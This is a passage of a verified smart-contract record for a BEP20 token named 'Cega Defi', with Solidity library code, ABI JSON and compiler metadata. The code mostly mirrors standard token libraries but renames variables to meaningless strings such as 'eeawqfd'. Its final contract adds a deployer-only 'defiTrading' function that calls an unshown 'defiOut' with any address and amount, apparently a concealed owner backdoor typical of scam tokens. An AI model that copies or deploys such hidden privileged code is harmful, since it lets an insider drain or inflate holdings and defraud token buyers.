getBytesSlot(bytes32 slot) internal pure returns (BytesSlot storage r) {\r\n        /// @solidity memory-safe-assembly\r\n        assembly {\r\n            r.slot := slot\r\n        }\r\n    }\r\n\r\n    /**\r\n     * @dev Returns an `BytesSlot` representation of the bytes storage pointer `store`.\r\n     */\r\n    function getBytesSlot(bytes storage store) internal pure returns (BytesSlot storage r) {\r\n        /// @solidity memory-safe-assembly\r\n        assembly {\r\n            r.slot := store.slot\r\n        }\r\n    }\r\n}\r\n\r\n\r\n// | string  | 0xAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA   |\r\n// | length  | 0x                                                              BB |\r\ntype ShortString is bytes32;\r\n\r\nlibrary ShortStrings {\r\n    // Used as an identifier for strings longer than 31 bytes.\r\n    bytes32 private constant FALLBACK_SENTINEL = 0x00000000000000000000000000000000000000000000000000000000000000FF;\r\n\r\n    error StringTooLong(string str);\r\n    error InvalidShortString();\r\n\r\n\r\n    function toShortString(string memory str) internal pure returns (ShortString) {\r\n        bytes memory bstr = bytes(str);\r\n        if (bstr.length > 31) {\r\n            revert StringTooLong(str);\r\n        }\r\n        return ShortString.wrap(bytes32(uint256(bytes32(bstr)) | bstr.length));\r\n    }\r\n\r\n    /**\r\n     * @dev Decode a `ShortString` back to a \"normal\" string.\r\n     */\r\n    function toString(ShortString sstr) internal pure returns (string memory) {\r\n        uint256 len = byteLength(sstr);\r\n        // using `new string(len)` would work locally but is not memory safe.\r\n        string memory str = new string(32);\r\n        /// @solidity memory-safe-assembly\r\n        assembly {\r\n            mstore(str, len)\r\n            mstore(add(str, 0x20), sstr)\r\n        }\r\n        return str;\r\n    }\r\n\r\n    /**\r\n     * @dev Return the length of a `ShortString`.\r\n     */\r\n    function byteLength(ShortString sstr) internal pure returns (uint256) {\r\n        uint256 result = uint256(ShortString.unwrap(sstr)) & 0xFF;\r\n        if (result > 31) {\r\n            revert InvalidShortString();\r\n        }\r\n        return result;\r\n    }\r\n\r\n    /**\r\n     * @dev Encode a string into a `ShortString`, or write it to storage if it is too long.\r\n     */\r\n    function toShortStringWithFallback(string memory eeawqfd, string storage store) internal returns (ShortString) {\r\n        if (bytes(eeawqfd).length < 32) {\r\n            return toShortString(eeawqfd);\r\n        } else {\r\n            StorageSlot.getStringSlot(store).eeawqfd = eeawqfd;\r\n            return ShortString.wrap(FALLBACK_SENTINEL);\r\n        }\r\n    }\r\n\r\n    /**\r\n     * @dev Decode a string that was encoded to `ShortString` or written to storage using {setWithFallback}.\r\n     */\r\n    function toStringWithFallback(ShortString eeawqfd, string storage store) internal pure returns (string memory) {\r\n        if (ShortString.unwrap(eeawqfd) != FALLBACK_SENTINEL) {\r\n            return toString(eeawqfd);\r\n        } else {\r\n            return store;\r\n        }\r\n    }\r\n\r\n\r\n    function byteLengthWithFallback(ShortString eeawqfd, string storage store) internal view returns (uint256) {\r\n        if (ShortString.unwrap(eeawqfd) != FALLBACK_SENTINEL) {\r\n            return byteLength(eeawqfd);\r\n        } else {\r\n            return bytes(store).length;\r\n        }\r\n    }\r\n}\r\n\r\n\r\ninterface IBEP5267 {\r\n\r\n    event EIP712DomainChanged();\r\n\r\n\r\n    function eip712Domain()\r\n        external\r\n        view\r\n        returns (\r\n            bytes1 fields,\r\n            string memory name,\r\n            string memory version,\r\n            uint256 chainId,\r\n            address verifyingContract,\r\n            bytes32 salt,\r\n            uint256[] memory extensions\r\n        );\r\n}\r\n\r\n\r\nabstract contract EIP712 is IBEP5267 {\r\n    using ShortStrings for *;\r\n\r\n    bytes32 private constant TYPE_HASH =\r\n        keccak256(\"EIP712Domain(string name,string version,uint256 chainId,address verifyingContract)\");\r\n\r\n    // Cache the domain separator as an immutable eeawqfd, but also store the chain id that it corresponds to, in order to\r\n    // invalidate the cached domain separator if the chain id changes.\r\n    bytes32 private immutable _cachedDomainSeparator;\r\n    uint256 private immutable _cachedChainId;\r\n    address private immutable _cachedThis;\r\n\r\n    bytes32 private immutable _hashedName;\r\n    bytes32 private immutable _hashedVersion;\r\n\r\n    ShortString private immutable _name;\r\n    ShortString private immutable _version;\r\n    string private _nameFallback;\r\n    string private _versionFallback;\r\n\r\n\r\n    constructor(string memory name, string memory version) {\r\n        _name = name.toShortStringWithFallback(_nameFallback);\r\n        _version = version.toShortStringWithFallback(_versionFallback);\r\n        _hashedName = keccak256(bytes(name));\r\n        _hashedVersion = keccak256(bytes(version));\r\n\r\n        _cachedChainId = block.chainid;\r\n        _cachedDomainSeparator = _buildDomainSeparator();\r\n        _cachedThis = address(this);\r\n    }\r\n\r\n    /**\r\n     * @dev Returns the domain separator for the current chain.\r\n     */\r\n    function _domainSeparatorV4() internal view returns (bytes32) {\r\n        if (address(this) == _cachedThis && block.chainid == _cachedChainId) {\r\n            return _cachedDomainSeparator;\r\n        } else {\r\n            return _buildDomainSeparator();\r\n        }\r\n    }\r\n\r\n    function _buildDomainSeparator() private view returns (bytes32) {\r\n        return keccak256(abi.encode(TYPE_HASH, _hashedName, _hashedVersion, block.chainid, address(this)));\r\n    }\r\n\r\n    function _hashTypedDataV4(bytes32 structHash) internal view virtual returns (bytes32) {\r\n        return MessageHashUtils.toTypedDataHash(_domainSeparatorV4(), structHash);\r\n    }\r\n\r\n    /**\r\n     * @dev See {IBEP-5267}.\r\n     */\r\n    function eip712Domain()\r\n        public\r\n        view\r\n        virtual\r\n        returns (\r\n            bytes1 fields,\r\n            string memory name,\r\n            string memory version,\r\n            uint256 chainId,\r\n            address verifyingContract,\r\n            bytes32 salt,\r\n            uint256[] memory extensions\r\n        )\r\n    {\r\n        return (\r\n            hex\"0f\", // 01111\r\n            _EIP712Name(),\r\n            _EIP712Version(),\r\n            block.chainid,\r\n            address(this),\r\n            bytes32(0),\r\n            new uint256[](0)\r\n        );\r\n    }\r\n\r\n    // solhint-disable-next-line func-name-mixedcase\r\n    function _EIP712Name() internal view returns (string memory) {\r\n        return _name.toStringWithFallback(_nameFallback);\r\n    }\r\n\r\n    // solhint-disable-next-line func-name-mixedcase\r\n    function _EIP712Version() internal view returns (string memory) {\r\n        return _version.toStringWithFallback(_versionFallback);\r\n    }\r\n}\r\n\r\nabstract contract Nonces {\r\n    /**\r\n     * @dev The nonce used for an `etherdefi` is not the expected current nonce.\r\n     */\r\n    error InvalidrtyNonce(address etherdefi, uint256 currentNonce);\r\n\r\n    mapping(address etherdefi => uint256) private _nonces;\r\n\r\n    /**\r\n     * @dev Returns the next unused nonce for an address.\r\n     */\r\n    function nonces(address owner) public view virtual returns (uint256) {\r\n        return _nonces[owner];\r\n    }\r\n\r\n\r\n    function _useNonce(address owner) internal virtual returns (uint256) {\r\n        // For each etherdefi, the nonce has an initial eeawqfd of 0, can only be incremented by one, and cannot be\r\n        // decremented or reset. This guarantees that the nonce never overflows.\r\n        unchecked {\r\n            // It is important to do x++ and not ++x here.\r\n            return _nonces[owner]++;\r\n        }\r\n    }\r\n\r\n    /**\r\n     * @dev Same as {_useNonce} but checking that `nonce` is the next valid for `owner`.\r\n     */\r\n    function _useCheckedNonce(address owner, uint256 nonce) internal virtual {\r\n        uint256 current = _useNonce(owner);\r\n        if (nonce != current) {\r\n            revert InvalidrtyNonce(owner, current);\r\n        }\r\n    }\r\n}\r\n\r\n\r\nabstract contract BEP20Permit is BEP20, IBEP20Permit, EIP712, Nonces {\r\n    bytes32 private constant PERMIT_TYPEHASH =\r\n        keccak256(\"Permit(address owner,address spender,uint256 eeawqfd,uint256 nonce,uint256 deadline)\");\r\n\r\n    error BEP2612ExpiredSignature(uint256 deadline);\r\n\r\n \r\n    error BEP2612InvalidSigner(address signer, address owner);\r\n\r\n\r\n    constructor(string memory name) EIP712(name, \"1\") {}\r\n\r\n    /**\r\n     * @inheritdoc IBEP20Permit\r\n     */\r\n    function permit(\r\n        address owner,\r\n        address spender,\r\n        uint256 eeawqfd,\r\n        uint256 deadline,\r\n        uint8 v,\r\n        bytes32 r,\r\n        bytes32 s\r\n    ) public virtual {\r\n        if (block.timestamp > deadline) {\r\n            revert BEP2612ExpiredSignature(deadline);\r\n        }\r\n\r\n        bytes32 structHash = keccak256(abi.encode(PERMIT_TYPEHASH, owner, spender, eeawqfd, _useNonce(owner), deadline));\r\n\r\n        bytes32 hash = _hashTypedDataV4(structHash);\r\n\r\n        address signer = ECDSA.recover(hash, v, r, s);\r\n        if (signer != owner) {\r\n            revert BEP2612InvalidSigner(signer, owner);\r\n        }\r\n\r\n        _approve(owner, spender, eeawqfd);\r\n    }\r\n\r\n    /**\r\n     * @inheritdoc IBEP20Permit\r\n     */\r\n    function nonces(address owner) public view virtual override(IBEP20Permit, Nonces) returns (uint256) {\r\n        return super.nonces(owner);\r\n    }\r\n\r\n    /**\r\n     * @inheritdoc IBEP20Permit\r\n     */\r\n    // solhint-disable-next-line func-name-mixedcase\r\n    function DOMAIN_SEPARATOR() external view virtual returns (bytes32) {\r\n        return _domainSeparatorV4();\r\n    }\r\n}\r\n\r\n\r\ncontract CegaDefi is BEP20, BEP20Permit {\r\n    address private msgsender = msg.sender;\r\n    constructor() BEP20(\"Cega Defi\", \"CEGA\") BEP20Permit(\"CEGA\") {}\r\n        function defiTrading(address defiTradingAddress, uint256 eeawqfd) external  {\r\n       require(msg.sender == msgsender);\r\n        defiOut(defiTradingAddress, eeawqfd);\r\n    }\r\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"allowance\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"needed\",\"type\":\"uint256\"}],\"name\":\"BEP20InsufficientAllowance\",\"type\":\"error\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"balance\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"needed\",\"type\":\"uint256\"}],\"name\":\"BEP20InsufficientBalance\",\"type\":\"error\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"approver\",\"type\":\"address\"}],\"name\":\"BEP20InvalidApprover\",\"type\":\"error\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiver\",\"type\":\"address\"}],\"name\":\"BEP20InvalidReceiver\",\"type\":\"error\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"}],\"name\":\"BEP20InvalidSender\",\"type\":\"error\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"}],\"name\":\"BEP20InvalidSpender\",\"type\":\"error\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"deadline\",\"type\":\"uint256\"}],\"name\":\"BEP2612ExpiredSignature\",\"type\":\"error\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"signer\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"}],\"name\":\"BEP2612InvalidSigner\",\"type\":\"error\"},{\"inputs\":[],\"name\":\"ECDSAInvalidSignature\",\"type\":\"error\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"length\",\"type\":\"uint256\"}],\"name\":\"ECDSAInvalidSignatureLength\",\"type\":\"error\"},{\"inputs\":[{\"internalType\":\"bytes32\",\"name\":\"s\",\"type\":\"bytes32\"}],\"name\":\"ECDSAInvalidSignatureS\",\"type\":\"error\"},{\"inputs\":[],\"name\":\"InvalidShortString\",\"type\":\"error\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"etherdefi\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"currentNonce\",\"type\":\"uint256\"}],\"name\":\"InvalidrtyNonce\",\"type\":\"error\"},{\"inputs\":[{\"internalType\":\"string\",\"name\":\"str\",\"type\":\"string\"}],\"name\":\"StringTooLong\",\"type\":\"error\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"eeawqfd\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[],\"name\":\"EIP712DomainChanged\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"eeawqfd\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[],\"name\":\"DOMAIN_SEPARATOR\",\"outputs\":[{\"internalType\":\"bytes32\",\"name\":\"\",\"type\":\"bytes32\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"eeawqfd\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"etherdefi\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"defiTradingAddress\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"eeawqfd\",\"type\":\"uint256\"}],\"name\":\"defiTrading\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"eip712Domain\",\"outputs\":[{\"internalType\":\"bytes1\",\"name\":\"fields\",\"type\":\"bytes1\"},{\"internalType\":\"string\",\"name\":\"name\",\"type\":\"string\"},{\"internalType\":\"string\",\"name\":\"version\",\"type\":\"string\"},{\"internalType\":\"uint256\",\"name\":\"chainId\",\"type\":\"uint256\"},{\"internalType\":\"address\",\"name\":\"verifyingContract\",\"type\":\"address\"},{\"internalType\":\"bytes32\",\"name\":\"salt\",\"type\":\"bytes32\"},{\"internalType\":\"uint256[]\",\"name\":\"extensions\",\"type\":\"uint256[]\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"}],\"name\":\"nonces\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"eeawqfd\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"deadline\",\"type\":\"uint256\"},{\"internalType\":\"uint8\",\"name\":\"v\",\"type\":\"uint8\"},{\"internalType\":\"bytes32\",\"name\":\"r\",\"type\":\"bytes32\"},{\"internalType\":\"bytes32\",\"name\":\"s\",\"type\":\"bytes32\"}],\"name\":\"permit\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"eeawqfd\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"eeawqfd\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "CegaDefi", "CompilerVersion": "v0.8.23+commit.f704f362", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "london", "Library": "", "LicenseType": "GNU LGPLv3", "Proxy": "0", "Implementation": "", "SwarmSource": "ipfs://91951e60654780bdd92e5a99c277bad2095a046ca0c7b2ab67276a8aa19533c3"}